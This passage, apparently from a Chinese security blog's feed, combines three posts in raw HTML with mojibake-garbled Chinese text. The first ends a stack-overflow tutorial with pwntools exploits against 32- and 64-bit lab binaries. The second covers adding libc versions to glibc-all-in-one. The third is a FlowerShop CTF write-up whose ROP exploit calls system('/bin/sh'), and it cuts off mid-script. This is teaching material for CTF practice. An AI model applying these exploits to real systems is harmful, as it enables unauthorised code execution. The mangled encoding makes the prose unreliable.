class="hljs-comment">#success_addrå³ä¸ºsuccesså‡½æ•°åœ°å€</span><br></code></pre></td></tr></table></figure><p>ç”±äº gets ä¼šè¯»åˆ°å›è½¦æ‰ç®—ç»“æŸï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è¯»å–æ‰€æœ‰çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”å°† saved ebp è¦†ç›–ä¸º bbbbï¼Œå°† retaddrï¼ˆè¿”å›åœ°å€ï¼‰ è¦†ç›–ä¸º success_addrï¼Œå³0x8049196ï¼Œæ­¤æ—¶çš„æ ˆç»“æ„ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">             +-----------------+<br>             |    0x08049186   |<br>             +-----------------+<br>             |       bbbb      |<br>      ebp---&gt;+-----------------+<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>s,ebp-0x14--&gt;+-----------------+<br></code></pre></td></tr></table></figure><p>ç¼–å†™exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># æ„é€ ä¸ç¨‹åºäº¤äº’çš„å¯¹è±¡</span><br>p = process(<span class="hljs-string">&#x27;./pwn32&#x27;</span>)<br>success_addr = <span class="hljs-number">0x8049196</span><br><span class="hljs-comment"># æ„é€ payload</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x14</span> + <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x4</span> + p32(success_addr)<br><span class="hljs-comment">#print(p32(success_addr))</span><br><span class="hljs-comment"># å‘ç¨‹åºå‘é€å­—ç¬¦ä¸²</span><br>p.sendline(payload)<br><span class="hljs-comment"># å°†ä»£ç äº¤äº’è½¬æ¢ä¸ºæ‰‹åŠ¨äº¤äº’</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p>è¿è¡Œ exp</p><img src="/post/47670/1729694852185-efb75896-5f88-4f67-9afd-564d99a40397-1735222654797-168.png" class="" title="img"><h3 id="64-ä½ç¨‹åº"><a href="#64-ä½ç¨‹åº" class="headerlink" title="64 ä½ç¨‹åº"></a>64 ä½ç¨‹åº</h3><p>Cè¯­è¨€ä¾‹å­åŒä¸Š</p><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç¼–è¯‘ç¨‹åº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -fno-stack-protector -no-pie pwn.c -o pwn64<br></code></pre></td></tr></table></figure><img src="/post/47670/1729693237007-269ca430-7642-41d1-bbd0-c9421f4318f7-1735222654797-169.png" class="" title="img"><p>ç¼–è¯‘æˆåŠŸåï¼Œä½¿ç”¨checksecæ£€æŸ¥ç¼–è¯‘çš„æ–‡ä»¶</p><img src="/post/47670/1729693266402-63709752-4749-401c-967a-d0e6f7dac4ae-1735222654797-170.png" class="" title="img"><p>æˆ‘ä»¬åŒæ ·åˆ©ç”¨ IDA æ¥åç¼–è¯‘ä¸€ä¸‹äºŒè¿›åˆ¶ç¨‹åºå¹¶æŸ¥çœ‹vulnerable å‡½æ•°ï¼Œè¯¥å­—ç¬¦ä¸²è·ç¦» rbp çš„é•¿åº¦ä¸º 0xC</p><img src="/post/47670/1729418446953-c66b8407-5364-40b8-8a80-9d2312b4bec1-1735222654797-171.png" class="" title="img"><p>å¦‚æœæˆ‘ä»¬åŒæ ·æŒ‰ç…§ 32 ä½ç¨‹åºçš„æ–¹æ³•ï¼Œå°† success å‡½æ•°çš„åœ°å€ 0x401176 ä½œä¸ºè¿”å›åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">success_addr = <span class="hljs-number">0x401176</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xC</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(success_addr)<br></code></pre></td></tr></table></figure><img src="/post/47670/1729693421434-141797d8-5234-4d5d-843b-b4d74a352bd7-1735222654797-172.png" class="" title="img"><p>å†™å‡º exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./pwn64&#x27;</span>)<br><br>success_addr = <span class="hljs-number">0x401176</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xC</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(success_addr)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬åï¼Œå‘ç°å¹¶æ²¡æœ‰è·å–åˆ°å‘½ä»¤è¡Œçš„æ§åˆ¶æƒ</p><img src="/post/47670/1729695072591-d002a40f-a791-4ac4-8488-7ec354cbeaa9-1735222654797-173.png" class="" title="img"><h3 id="è°ƒè¯•è¿‡ç¨‹"><a href="#è°ƒè¯•è¿‡ç¨‹" class="headerlink" title="è°ƒè¯•è¿‡ç¨‹"></a>è°ƒè¯•è¿‡ç¨‹</h3><p>é‚£ä¹ˆç©¶ç«Ÿæ˜¯ä»€ä¹ˆåŸå› å¯¼è‡´æ²¡æœ‰è·å–åˆ°æ§åˆ¶æƒï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è„šæœ¬ä¸­åŠ å…¥è°ƒè¯•è¯­å¥ï¼Œç„¶åé€æ­¥è°ƒè¯•å¯»æ‰¾åŸå› </p><p>è°ƒè¯•è„šæœ¬ï¼Œä½¿ç”¨ attach è¯­å¥å°†æ–­ç‚¹ä¸‹åœ¨ gets å‡½æ•°å³ 0x4011BC å¤„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./pwn64&#x27;</span>)<br><br>success_addr = <span class="hljs-number">0x401176</span><br><br>attach(p, <span class="hljs-string">&#x27;b *0x4011BC&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xC</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(success_addr)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>è¾“å…¥ ni æŒ‡ä»¤å›è½¦</p><img src="/post/47670/1729695670527-12e448a1-06a9-4ea8-a976-1d235c86c8d5-1735222654797-174.png" class="" title="img"><p>åŒæ—¶ï¼Œæˆ‘ä»¬å…³æ³¨æ±‡ç¼–çª—å£ï¼Œç„¶åä¸€ç›´å›è½¦</p><img src="/post/47670/1729695707477-e316e653-d8ce-4c86-a983-173f419efde0-1735222654797-175.png" class="" title="img"><p>å½“ç¨‹åºè¿è¡Œè‡³ vulerable å‡½æ•°å¤„ï¼Œæˆ‘ä»¬å¯ä»¥æ”¾æ…¢é€Ÿåº¦å¹¶è§‚å¯Ÿç¨‹åºè¿è¡Œæƒ…å†µ</p><img src="/post/47670/1729695828137-bcf5b41f-0836-4baf-89c6-16db12e603cd-1735222654797-176.png" class="" title="img"><p>å½“æ‰§è¡Œå®Œ puts å‡½æ•°ä¹‹åå¯ä»¥çœ‹åˆ°ç¨‹åºæ‰“å°äº†è¾“å…¥å†…å®¹</p><img src="/post/47670/1729696069104-9bbf445d-6904-4c9b-9619-97cb189a9447-1735222654797-177.png" class="" title="img"><p>ç»§ç»­å›è½¦ï¼Œå‘ç°ç¨‹åºå·²ç»è¿è¡Œè‡³ success å‡½æ•°ï¼Œæ‰§è¡Œå®Œ puts ä¹‹åå°†å†…å®¹æ‰“å°</p><img src="/post/47670/1729696160504-e8a73f85-de9c-4033-9c18-787bbb0dbee4-1735222654797-178.png" class="" title="img"><p>ç»§ç»­å›è½¦ï¼Œå½“ç¨‹åºæ‰§è¡Œåˆ° system æ—¶æ³¨æ„è§‚å¯Ÿ</p><img src="/post/47670/1729696280049-405101de-4a8c-404f-b557-4160fa1ecb79-1735222654797-179.png" class="" title="img"><p>å›è½¦ä¹‹åï¼Œç¨‹åºä¼šè·³å…¥ do_system å‡½æ•°æ‰§è¡Œ</p><img src="/post/47670/1729696357940-cd504cab-30fc-4019-bef6-6da0bdfe3299-1735222654798-180.png" class="" title="img"><p>å†æ¬¡å›è½¦ä¹‹åå‘ç°ç¨‹åºå¹¶æ²¡æœ‰ç»§ç»­æ‰§è¡Œï¼Œè¿™å®é™…ä¸Šæ˜¯ç¨‹åºå¡åœ¨äº† movaps æŒ‡ä»¤ä¸Šï¼Œè¿™ä¸ªæŒ‡ä»¤æ¶‰åŠåˆ° <code>xmm</code> å¯„å­˜å™¨ï¼Œè¯¥å¯„å­˜å™¨ä¸º128ä½ï¼Œå°±è¦æ±‚ rsp ä¸º 16 å­—èŠ‚å¯¹é½ã€‚16å­—èŠ‚å¯¹é½æ„å‘³ç€ rsp åœ°å€å¿…é¡»èƒ½å¤Ÿè¢«16æ•´é™¤ï¼Œå³åœ°å€çš„æœ€ä½4ä½ï¼ˆåœ¨äºŒè¿›åˆ¶è¡¨ç¤ºä¸­ï¼‰å¿…é¡»ä¸º0ã€‚</p><p>é‚£ä¹ˆåº”è¯¥æ€æ ·è¿›è¡Œ 16 å­—èŠ‚å¯¹é½å‘¢ï¼Œå…·ä½“æ–¹æ³•å°±æ˜¯è·³è¿‡ success å‡½æ•°ä¸­ä¸€æ¡æ ˆæŒ‡ä»¤å³ push rbp ï¼Œå‡å°‘â¼€æ¬¡å¯¹æ ˆçš„æ“ä½œï¼Œç„¶åé€‰ç”¨ 0x40117B ä½œä¸ºè¿”å›åœ°å€ã€‚</p><img src="/post/47670/1729697167631-257581c7-6a3b-4d5a-a77d-9425dd79676f-1735222654798-181.png" class="" title="img"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./pwn64&#x27;</span>)<br><br>success1_addr = <span class="hljs-number">0x40117B</span><br><br><span class="hljs-comment"># attach(p, &#x27;b *0x4011BC&#x27;)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xC</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(success1_addr)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬</p><img src="/post/47670/1729697249664-49cf7e81-9dc2-4720-93d6-b643c04c049a-1735222654798-182.png" class="" title="img"><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><h3 id="å¯»æ‰¾å±é™©å‡½æ•°"><a href="#å¯»æ‰¾å±é™©å‡½æ•°" class="headerlink" title="å¯»æ‰¾å±é™©å‡½æ•°"></a>å¯»æ‰¾å±é™©å‡½æ•°</h3><p>é€šè¿‡å¯»æ‰¾å±é™©å‡½æ•°ï¼Œæˆ‘ä»¬å¿«é€Ÿç¡®å®šç¨‹åºæ˜¯å¦å¯èƒ½æœ‰æ ˆæº¢å‡ºï¼Œä»¥åŠæœ‰çš„è¯ï¼Œæ ˆæº¢å‡ºçš„ä½ç½®åœ¨å“ªé‡Œã€‚å¸¸è§çš„å±é™©å‡½æ•°å¦‚ä¸‹</p><ul><li><p>è¾“å…¥</p><ul><li><p>getsï¼Œç›´æ¥è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥â€™\x00â€™</p></li><li><p>scanf</p></li><li><p>vscanf</p></li></ul></li><li><p>è¾“å‡º</p><ul><li><p>sprintf</p></li><li><p>å­—ç¬¦ä¸²</p></li><li><p>strcpyï¼Œå­—ç¬¦ä¸²å¤åˆ¶ï¼Œé‡åˆ°â€™\x00â€™åœæ­¢</p></li><li><p>strcatï¼Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œé‡åˆ°â€™\x00â€™åœæ­¢</p></li><li><p>bcopy</p></li></ul></li></ul><h3 id="ç¡®å®šå¡«å……é•¿åº¦"><a href="#ç¡®å®šå¡«å……é•¿åº¦" class="headerlink" title="ç¡®å®šå¡«å……é•¿åº¦"></a>ç¡®å®šå¡«å……é•¿åº¦</h3><p>è¿™ä¸€éƒ¨åˆ†ä¸»è¦æ˜¯è®¡ç®—<strong>æˆ‘ä»¬æ‰€è¦æ“ä½œçš„åœ°å€ä¸æˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€çš„è·ç¦»</strong>ã€‚å¸¸è§çš„æ“ä½œæ–¹æ³•å°±æ˜¯æ‰“å¼€ IDAï¼Œæ ¹æ®å…¶ç»™å®šçš„åœ°å€è®¡ç®—åç§»ã€‚ä¸€èˆ¬å˜é‡ä¼šæœ‰ä»¥ä¸‹å‡ ç§ç´¢å¼•æ¨¡å¼</p><ul><li>ç›¸å¯¹äºæ ˆåŸºåœ°å€çš„çš„ç´¢å¼•ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡æŸ¥çœ‹ EBP ç›¸å¯¹åç§»è·å¾—</li><li>ç›¸å¯¹åº”æ ˆé¡¶æŒ‡é’ˆçš„ç´¢å¼•ï¼Œä¸€èˆ¬éœ€è¦è¿›è¡Œè°ƒè¯•ï¼Œä¹‹åè¿˜æ˜¯ä¼šè½¬æ¢åˆ°ç¬¬ä¸€ç§ç±»å‹ã€‚</li><li>ç›´æ¥åœ°å€ç´¢å¼•ï¼Œå°±ç›¸å½“äºç›´æ¥ç»™å®šäº†åœ°å€ã€‚</li></ul><p>ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬ä¼šæœ‰å¦‚ä¸‹çš„è¦†ç›–éœ€æ±‚</p><ul><li><strong>è¦†ç›–å‡½æ•°è¿”å›åœ°å€</strong>ï¼Œè¿™æ—¶å€™å°±æ˜¯ç›´æ¥çœ‹ EBP å³å¯ã€‚</li><li><strong>è¦†ç›–æ ˆä¸ŠæŸä¸ªå˜é‡çš„å†…å®¹</strong>ï¼Œè¿™æ—¶å€™å°±éœ€è¦æ›´åŠ ç²¾ç»†çš„è®¡ç®—äº†ã€‚</li><li><strong>è¦†ç›– bss æ®µæŸä¸ªå˜é‡çš„å†…å®¹</strong>ã€‚</li><li>æ ¹æ®ç°å®æ‰§è¡Œæƒ…å†µï¼Œè¦†ç›–ç‰¹å®šçš„å˜é‡æˆ–åœ°å€çš„å†…å®¹ã€‚</li></ul><p>ä¹‹æ‰€ä»¥æˆ‘ä»¬æƒ³è¦è¦†ç›–æŸä¸ªåœ°å€ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬æƒ³é€šè¿‡è¦†ç›–åœ°å€çš„æ–¹æ³•æ¥<strong>ç›´æ¥æˆ–è€…é—´æ¥åœ°æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹</strong>ã€‚</p><h2 id="å‚è€ƒé˜…è¯»"><a href="#å‚è€ƒé˜…è¯»" class="headerlink" title="å‚è€ƒé˜…è¯»"></a>å‚è€ƒé˜…è¯»</h2><p><a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>glibc-all-in-oneæ·»åŠ libc</title>
    <link href="/post/17727.html"/>
    <url>/post/17727.html</url>
    
    <content type="html"><![CDATA[<h1 id="glibc-all-in-oneä»‹ç»"><a href="#glibc-all-in-oneä»‹ç»" class="headerlink" title="glibc-all-in-oneä»‹ç»"></a>glibc-all-in-oneä»‹ç»</h1><p>ä¸€ä¸ªæ–¹ä¾¿çš„ glibc äºŒè¿›åˆ¶å’Œè°ƒè¯•æ–‡ä»¶ä¸‹è½½å™¨ä»¥åŠæºä»£ç è‡ªåŠ¨æ„å»ºå™¨</p><p>ç‰¹ç‚¹ï¼š</p><ul><li>ä¸‹è½½ glibc äºŒè¿›åˆ¶æ–‡ä»¶</li><li>ä¸‹è½½ glibc è°ƒè¯•æ–‡ä»¶</li><li>æå–è‡ªå®šä¹‰ glibc</li><li>ä¸‹è½½å¹¶ç¼–è¯‘ glibc æºä»£ç </li></ul><p>githubåœ°å€ï¼š<a href="https://github.com/matrix1001/glibc-all-in-one">glibc-all-in-one</a></p><h1 id="æ·»åŠ libc"><a href="#æ·»åŠ libc" class="headerlink" title="æ·»åŠ libc"></a>æ·»åŠ libc</h1><p>ç”±äºåœ¨åšå †é¢˜çš„æ—¶å€™ä¼šç¢°åˆ°ä¸€äº›ä¸å¸¸è§çš„ libc æˆ–è€… libc çš„å°ç‰ˆæœ¬ï¼Œè€Œä¸”åœ¨ glibc-all-in-one ä¸­ä¹Ÿæ‰¾ä¸åˆ°è¿™äº› libcï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯å¯ä»¥æ‰‹åŠ¨æ·»åŠ è¿™äº› libc å‘¢ï¼Œå¯¹äºè¿™ä¸€ç‚¹å®˜æ–¹ä¹Ÿç»™å‡ºäº†å¯¹åº”çš„æ·»åŠ æ–¹æ³•ã€‚</p><p>å®˜æ–¹ç»™å‡ºçš„æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ä¸‹è½½ libc6 å’Œlibc6-dbgä¸¤ä¸ªdebåŒ…ï¼Œç„¶åä½¿ç”¨ä»–ç»™å‡ºçš„ extract å·¥å…·æ¥è¿›è¡Œæ·»åŠ ã€‚</p><img src="/post/17727/1735134759907-5e7187b1-e74e-4430-893b-4dea8ce13382.png" class="" title="img"><p>ä¸‹é¢æˆ‘ä»¬ä»¥ 2.27-3ubuntu1.2 ä¸ºä¾‹</p><p>å…ˆä¸‹è½½ libc6 çš„ deb åŒ…</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">https://launchpad.net/ubuntu/bionic/amd64/libc6/2.27-3ubuntu1.2<br></code></pre></td></tr></table></figure><img src="/post/17727/1735135202942-3bf023b3-a7fc-44ec-b0b4-4c89c40dbd92.png" class="" title="img"><p>ç„¶åä¸‹è½½ libc6-dbg çš„debåŒ…</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">https://launchpad.net/ubuntu/bionic/amd64/libc6-dbg/2.27-3ubuntu1.2<br></code></pre></td></tr></table></figure><img src="/post/17727/1735135274778-7fe758c2-e21b-42c3-a256-738c8b82d5d2.png" class="" title="img"><p>æˆ‘ä»¬æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹æ¥å­˜æ”¾åˆšåˆšä¸‹è½½å¥½çš„ libc6 å’Œ libc6-dbg ä¸¤ä¸ª deb åŒ…ï¼Œè¿™é‡Œæˆ‘æ”¾åœ¨äº†<code>~/libc/2.27-3ubuntu1.2_amd64</code>ã€‚</p><img src="/post/17727/1735135309557-c2b76783-9795-401d-9a69-eb7dca50831e.png" class="" title="img"><p>åœ¨ glibc-all-in-one ä¸‹ä½¿ç”¨extractï¼Œç”Ÿæˆçš„ libc äºŒè¿›åˆ¶æ–‡ä»¶æˆ‘å­˜æ”¾åœ¨äº†<code>glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./extract ~/libc/2.27-3ubuntu1.2_amd64/libc6_2.27-3ubuntu1.2_amd64.deb ~/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64<br></code></pre></td></tr></table></figure><img src="/post/17727/1735135607355-2c2c005d-7da6-463d-bc68-ee321b64c264.png" class="" title="img"><p>å¯¹äº libc6-dbg ç”Ÿæˆçš„ libc è°ƒè¯•æ–‡ä»¶æˆ‘æ”¾åœ¨äº†<code>glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/.debug</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./extract ~/libc/2.27-3ubuntu1.2_amd64/libc6-dbg_2.27-3ubuntu1.2_amd64.deb ~/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/.debug<br></code></pre></td></tr></table></figure><img src="/post/17727/1735135750561-6c1cb8a6-5f0a-4263-b62e-81e172a61d6b.png" class="" title="img"><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p><a href="https://blog.csdn.net/m0_52772399/article/details/128182925#:~:text=%E6%A0%B9%E6%8D%AE%E5%BC%95%E7%94%A8%E5%92%8C%E5%BC%95%E7%94%A8%E7%9A%84%E4%BE%8B%E5%AD%90">å…³äºglibc-all-in-oneç¼ºå¤±libc_2.23-0ubuntu10 glibc-all-in-one-CSDNåšå®¢</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ç¬¬å››å±Šé•¿åŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ›-åˆèµ›Pwn</title>
    <link href="/post/44739.html"/>
    <url>/post/44739.html</url>
    
    <content type="html"><![CDATA[<h1 id="FlowerShop"><a href="#FlowerShop" class="headerlink" title="FlowerShop"></a>FlowerShop</h1><p>è¿™é“é¢˜ä¸»è¦æ³¨æ„ä¸‰ç‚¹</p><p>ä¸€æ˜¯ main å‡½æ•°ä¸­ï¼Œread å­˜åœ¨ä¸€ä¸ªå¯¹ moneyçš„æº¢å‡ºï¼Œä½†åé¢è¿˜æœ‰ä¸€ä¸ªæº¢å‡ºæ£€æµ‹ï¼Œå³æ£€æµ‹å½“è¾“å…¥è¿‡é•¿æ—¶ï¼Œè¾“å…¥ä¸­çš„ç‰¹å®šä½ç½®æ˜¯å¦ä¸ c ç›¸ç­‰ï¼Œc å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²â€™pwnâ€™ã€‚</p><p>å…ˆæ¥è®¡ç®—ä¸€ä¸‹ï¼Œname æ˜¯ rbp-0x40ï¼Œsrc æ˜¯ rbp-0xCï¼Œmoney æ˜¯ rbp-0x8ï¼Œå› æ­¤å…ˆè¾“å…¥ 0x40-0xC&#x3D;0x34 ä¸ª aï¼Œæ¥ç€è¦ä¸ c ä¸­çš„å­—ç¬¦ä¸²ç›¸åŒï¼Œå³å†è¾“å…¥ â€˜pwnâ€™ï¼Œå‰©ä¸‹ 5 å­—èŠ‚çš„å 4 å­—èŠ‚å³å¯æ§åˆ¶ money çš„å¤§å°ã€‚</p><img src="/post/44739/1730988519568-d4bc95bf-94f5-4185-9485-badaa8ff70ef.png" class="" title="img"><img src="/post/44739/1730988545250-2aad0486-8790-4fce-b7cf-763fe15351c2.png" class="" title="img"><p>äºŒæ˜¯ magic çš„å€¼ï¼Œå¯ä»¥çœ‹åˆ°åœ¨ shop å‡½æ•°ä¸­ï¼Œå½“è´­ä¹°äº†ä¸€ä¸ª magic åï¼Œmagic è¢«èµ‹å€¼ä¸º0x68732F6E69622ï¼Œè¿™å®é™…ä¸Šå°±æ˜¯&#x2F;bin&#x2F;sh å­—ç¬¦ä¸²çš„ 16 è¿›åˆ¶ï¼Œå› æ­¤ç¨‹åºä¸­ä¹Ÿå°±å­˜åœ¨äº†&#x2F;bin&#x2F;sh å­—ç¬¦ä¸²</p><img src="/post/44739/1730989568065-e8a6823f-17dd-4027-84a8-c962840a4fdd.png" class="" title="img"><p>ä¸‰æ˜¯å¦‚ä½•é€ æˆæ ˆæº¢å‡ºï¼ŒåŒæ ·æ˜¯ shop å‡½æ•°ï¼Œå­˜åœ¨ä¸€ä¸ª readï¼Œä½†å®ƒçš„å¤§å°è¢«é™åˆ¶ä¸º sizeï¼Œè€Œ size åœ¨ check å‡½æ•°ã€‚æŸ¥çœ‹ check å‡½æ•°ï¼Œcheck å‡½æ•°å®é™…å°±æ˜¯åœ¨åˆ¤æ–­ flower[0] æ˜¯å¦ç­‰äº 2 å’Œ flower[1] æ˜¯å¦ç­‰äº 1ï¼Œè¿™é‡Œçš„ flower[0] å’Œ flower[1] å®é™…ä¸Šå°±æ˜¯å½±æ˜Ÿç«ç‘°å’Œå¡å¸ƒå¥‡è¯ºç«ç‘°ï¼Œåªè¦è®©å½±æ˜Ÿç«ç‘°æ•°é‡ä¸º 2 å’Œå¡å¸ƒå¥‡è¯ºç«ç‘°æ•°é‡ä¸º 1 å°±èƒ½è¿”å› szie&#x3D;0x46ï¼Œè€Œè¿™ä¸ªå¤§å°è¶³å¤Ÿè¿›è¡Œæ ˆæº¢å‡º</p><img src="/post/44739/1730989688407-9e044b77-7eac-4534-b695-37b7e04fcfa1.png" class="" title="img"><img src="/post/44739/1730989993115-7ec8d503-57db-4641-9e18-0a130bc15a4e.png" class="" title="img"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;8.147.129.22&#x27;, 15104)</span><br><br>ret_addr = <span class="hljs-number">0x4006f6</span><br>system_plt = <span class="hljs-number">0x400730</span><br>magic_addr = <span class="hljs-number">0x601840</span><br>pop_rdi_ret = <span class="hljs-number">0x400f13</span><br><br>p.recvuntil(<span class="hljs-string">&quot;è¯·è¾“å…¥ä½ çš„å§“å:&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x34</span> + <span class="hljs-string">b&#x27;pwna&#x27;</span>+<span class="hljs-string">b&#x27;99&#x27;</span><br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;è¯·è¾“å…¥ä½ çš„é€‰é¡¹:&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;è¯·è¾“å…¥è´­ä¹°çš„å•†å“åºå·:&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;c&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;ä½ æƒ³è¦ç»§ç»­ä¹°èŠ±å—? 1/0&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;è¯·è¾“å…¥è´­ä¹°çš„å•†å“åºå·:&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;ä½ æƒ³è¦ç»§ç»­ä¹°èŠ±å—? 1/0&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;è¯·è¾“å…¥è´­ä¹°çš„å•†å“åºå·:&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;b&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;ä½ æƒ³è¦ç»§ç»­ä¹°èŠ±å—? 